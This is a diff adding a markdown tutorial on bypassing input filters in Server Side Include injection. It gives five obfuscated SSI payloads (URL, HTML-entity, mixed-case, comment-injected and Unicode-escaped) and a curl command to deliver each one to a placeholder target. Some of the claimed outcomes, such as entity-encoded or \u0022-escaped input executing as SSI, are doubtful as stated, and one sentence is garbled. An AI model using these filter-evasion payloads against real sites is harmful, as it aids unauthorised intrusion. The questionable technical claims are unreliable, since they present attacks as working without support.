@@ -1,0 +1,125 @@
+---
+title: Evasion Techniques in SSI Injection
+description: Explore advanced evasion techniques for bypassing filters in SSI injection
+  attacks, including encoding, syntax manipulation, and Unicode tactics.
+keywords:
+- SSI injection
+- evasion techniques
+- filter bypass
+- encoding strategies
+- syntax manipulation
+- Unicode evasion
+- web application security
+- input validation
+- security filters
+---
+
+# Evasion Techniques
+
+## Context
+
+This article explores various evasion techniques used to bypass input filters and security defenses during Server Side Include (SSI) injection attacks. A solid understanding of server-side includes, web server architecture, input sanitization, and the general techniques of SSI injection is assumed. The focus here is on practical evasion methods that permit the execution of SSI directives despite security controls.
+
+## Theory
+
+### Filter Evasion Principles in SSI Injection
+
+Evasion techniques manipulate attack payloads to bypass input validation mechanisms during SSI injection attacks. Filters, typically relying on specific patterns to detect malicious input, can be circumvented through strategic payload alterations. Web servers often handle input parsing and normalization in ways that present opportunities for effective evasion.
+
+### Encoding and Obfuscation Strategies
+
+Encoding techniques transform characters within a payload into different representations, which may slip past security filters. Attackers frequently use encodings such as URL, HTML entity, or Unicode to encode SSI directives and avoid detection. Some security checks decode inputs only once and may not recognize or handle all encoding formats, allowing cleverly encoded payloads to bypass them.
+
+### Syntax Manipulation and Substitution
+
+By modifying the syntax of SSI directives—altering case, adding whitespace, inserting comments, or substituting characters—attackers can evade pattern-based filters. Employing mixed-case styles, embedding HTML comments, or using extra spaces within SSI commands can disrupt filter logic, which often does not normalize such input factors before checking for threats.
+
+## Practice
+
+### URL Encoding Bypass for SSI Injection
+
+- **Payload**: Utilize URL encoding to obscure SSI directives.
+
+    ```http
+    <!--%23echo%20var%3D%22DOCUMENT_ROOT%22-->
+    ```
+
+- **Command**: Send the encoded payload to a vulnerable application.
+
+    ```bash
+    curl -X POST -d 'input=<!--%23echo%20var%3D%22DOCUMENT_ROOT%22-->' http://target-app/submit
+    ```
+
+- **Outcome**: Despite input filters, the SSI directive executes because encoding bypassed pattern checks.
+
+### HTML Entity Encoding Evasion
+
+- **Payload**: Encode SSI directive using HTML entities to err bypass filters.
+
+    ```html
+    &lt;!--#echo var=&quot;DOCUMENT_ROOT&quot; --&gt;
+    ```
+
+- **Command**: Inject the entity-encoded payload into the target.
+
+    ```bash
+    curl -X POST -d 'input=&lt;!--#echo var=&quot;DOCUMENT_ROOT&quot; --&gt;' http://target-app/submit
+    ```
+
+- **Outcome**: The server decodes the input, processing the SSI directive, defeating input validation rules.
+
+### Case Sensitivity and Whitespace Manipulation
+
+- **Payload**: Employ mixed case and additional spaces to confuse filters.
+
+    ```html
+    <!--#EcHo    var="DOCUMENT_ROOT"-->
+    ```
+
+- **Command**: Submit this obfuscated SSI command to the application.
+
+    ```bash
+    curl -X POST -d 'input=<!--#EcHo    var="DOCUMENT_ROOT"-->' http://target-app/submit
+    ```
+
+- **Outcome**: Filter oversight in case and whitespace normalization results in SSI execution.
+
+### Comment Injection within SSI Directives
+
+- **Payload**: Insert comments within the SSI directive to evade pattern filtering.
+
+    ```html
+    <!--#echo<!-- --> var="DOCUMENT_ROOT"-->
+    ```
+
+- **Command**: Deliver the obfuscated SSI payload to the target.
+
+    ```bash
+    curl -X POST -d 'input=<!--#echo<!-- --> var="DOCUMENT_ROOT"-->' http://target-app/submit
+    ```
+
+- **Outcome**: The server processes the SSI after either stripping the injected comment or ignoring it, circumventing the filter check.
+
+### Unicode and Character Substitution Evasion
+
+- **Payload**: Use Unicode escape sequences to substitute for potentially blocked characters.
+
+    ```html
+    <!--#echo var=\u0022DOCUMENT_ROOT\u0022-->
+    ```
+
+- **Command**: Send the Unicode-encoded SSI payload to the application.
+
+    ```bash
+    curl -X POST -d 'input=<!--#echo var=\u0022DOCUMENT_ROOT\u0022-->' http://target-app/submit
+    ```
+
+- **Outcome**: The server's Unicode normalization enables SSI execution, effectively bypassing the character-based filtering.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **CyberChef** 
+
+These tools facilitate crafting, testing, and delivering encoded and obfuscated payloads to exploit SSI vulnerabilities in web applications.
